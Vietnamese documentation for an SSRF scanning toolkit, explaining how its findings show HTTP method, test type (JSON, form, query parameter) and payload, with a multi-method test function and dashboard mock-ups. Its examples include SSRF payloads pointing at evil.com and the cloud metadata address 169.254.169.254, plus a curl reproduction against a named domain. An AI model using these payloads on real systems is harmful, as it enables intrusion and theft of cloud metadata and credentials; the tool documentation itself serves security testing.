# 📚 Giải thích về Test Methods và Test Types

## ❓ Vấn đề ban đầu

Khi scan một endpoint, bạn thấy kết quả như:
```
URL: https://quangtx.io.vn/products/1/compare/
Method: POST
Parameter: compare_url
Test Type: api_json_post
```

**Vấn đề:** Không rõ ràng endpoint này có hỗ trợ **cả GET và POST** hay chỉ POST? Payload được gửi như thế nào?

---

## ✅ Giải pháp hiện tại

### 1. **Test Type** - Loại test đã thực hiện

Sau khi cải thiện, mỗi finding sẽ hiển thị rõ ràng:

| Test Type | Ý nghĩa | Ví dụ |
|-----------|---------|-------|
| `api_json_post` | POST request với JSON body | `{"compare_url": "http://evil.com"}` |
| `api_form_post` | POST request với form data | `compare_url=http://evil.com` |
| `api_get_param` | GET request với query parameter | `?compare_url=http://evil.com` |

### 2. **HTTP Method** - Phương thức HTTP đã test

Hiển thị rõ ràng method nào đã được sử dụng:
- ✅ **GET** - Badge màu xanh dương
- ✅ **POST** - Badge màu xanh lá
- ✅ **PUT/DELETE** - Badge màu vàng

### 3. **Payload** - Dữ liệu đã gửi

Mỗi test sẽ hiển thị:
- **Original Value:** Giá trị gốc từ application
- **Test Payload:** Payload SSRF đã inject
- **Request:** Full HTTP request đã gửi
- **Response:** Response từ server

---

## 🔬 Test với nhiều HTTP Methods

### Cách sử dụng `test_ssrf_multi_method()`

Hàm mới này cho phép test endpoint với **nhiều HTTP methods**:

```python
from blackbox.detection.external_callback import ExternalCallbackDetector, CallbackServer

# Setup callback server
callback_server = CallbackServer()
callback_server.start()

# Create detector
detector = ExternalCallbackDetector(callback_server)

# Test với cả GET và POST
result = detector.test_ssrf_multi_method(
    target_url='https://quangtx.io.vn/products/1/compare/',
    parameter='compare_url',
    methods=['GET', 'POST', 'PUT'],  # Test 3 methods
    timeout=10
)

# Kết quả sẽ cho biết:
# - Method nào vulnerable
# - Method nào không vulnerable
# - Chi tiết test cho từng method
```

### Kết quả example:

```
🔬 MULTI-METHOD SSRF TESTING
============================================================
🎯 Target: https://quangtx.io.vn/products/1/compare/
📝 Parameter: compare_url
🔧 Methods to test: GET, POST, PUT
============================================================

📌 Testing with HTTP GET...
------------------------------------------------------------
❌ GET is NOT vulnerable (or blocked)
------------------------------------------------------------

📌 Testing with HTTP POST...
------------------------------------------------------------
✅ POST is VULNERABLE to SSRF!
------------------------------------------------------------

📌 Testing with HTTP PUT...
------------------------------------------------------------
❌ PUT is NOT vulnerable (or blocked)
------------------------------------------------------------

📊 MULTI-METHOD TEST SUMMARY
============================================================
🎯 Endpoint: https://quangtx.io.vn/products/1/compare/
📝 Parameter: compare_url
🔬 Methods tested: GET, POST, PUT
✅ Vulnerable methods: POST
📈 Vulnerability rate: 33.3%
============================================================
```

---

## 📊 Hiển thị trong Dashboard

### Trong Endpoint List

```
┌────────────────────────────────────────────────────────┐
│ https://quangtx.io.vn/products/1/compare/              │
│ 🔥 SSRF VULNERABLE!  POST  📌 compare_url              │
│ ─────────────────────────────────────────────────────  │
│ Method: POST  |  Type: 📄 JSON POST  |  Status: 200   │
│ Source: javascript  |  Payload sent                    │
└────────────────────────────────────────────────────────┘
```

### Trong Finding Details Modal

Khi click vào một finding, bạn sẽ thấy:

```
📊 Test Information
┌──────────────────────┬────────────────────────────────┐
│ HTTP Method:         │ POST                           │
│ Test Type:           │ 📄 JSON POST Request           │
│ Test Parameter:      │ compare_url                    │
│ Response Status:     │ 200                            │
│ Discovery Source:    │ 📜 JavaScript Analysis         │
│ Vulnerable:          │ ✅ YES - SSRF CONFIRMED!       │
└──────────────────────┴────────────────────────────────┘

📦 Sent Payload
{
  "compare_url": "http://169.254.169.254/latest/meta-data/"
}

🛠️ Reproduction Example
curl -X POST 'https://quangtx.io.vn/products/1/compare/' \
  -H 'Content-Type: application/json' \
  -d '{"compare_url": "https://your-callback-server.com/test"}'
```

---

## 🎯 Tóm tắt

### Trước khi cải thiện:
❌ Không rõ method nào đã test
❌ Không rõ payload gửi như thế nào
❌ Không test đầy đủ các methods

### Sau khi cải thiện:
✅ Hiển thị rõ **HTTP Method** (GET/POST/PUT/DELETE)
✅ Hiển thị rõ **Test Type** (JSON/Form/Query Param)
✅ Hiển thị rõ **Payload** đã gửi
✅ Có thể test **nhiều methods** cùng lúc với `test_ssrf_multi_method()`
✅ Report chi tiết cho từng method

---

## 📝 Ví dụ thực tế

### Scenario: Test endpoint `/api/fetch`

**Trước đây:**
```json
{
  "url": "/api/fetch",
  "method": "POST",
  "vulnerable": true
}
```
→ Không biết gì thêm!

**Bây giờ:**
```json
{
  "url": "/api/fetch",
  "method": "POST",
  "test_type": "api_json_post",
  "parameter": "target_url",
  "payload": "http://169.254.169.254/latest/meta-data/",
  "request": "POST /api/fetch HTTP/1.1\nContent-Type: application/json\n\n{\"target_url\": \"http://169.254.169.254/latest/meta-data/\"}",
  "response": "HTTP/1.1 200 OK\n{\"data\": \"ami-id\\ninstance-id...\"}",
  "vulnerable": true
}
```
→ Rõ ràng và chi tiết!

---

## 🔧 Cách sử dụng trong Web UI

1. **Upload Burp/HAR file** với traffic capture
2. Toolkit sẽ **tự động phân tích** và detect:
   - Endpoint URL
   - HTTP Method (GET/POST/PUT/DELETE)
   - Parameters
   - Request headers và body
3. **Test SSRF** với đúng method và test type
4. **Hiển thị kết quả** với đầy đủ thông tin

---

## 💡 Tips

- Nếu muốn test nhiều methods, dùng `test_ssrf_multi_method()`
- Check field `test_type` để biết payload được gửi như thế nào
- Check field `method` để biết HTTP method nào đã test
- Xem `request` field để biết full HTTP request đã gửi

---

**📅 Last updated:** 2025-11-21
**✍️ Author:** SSRF Toolkit Team
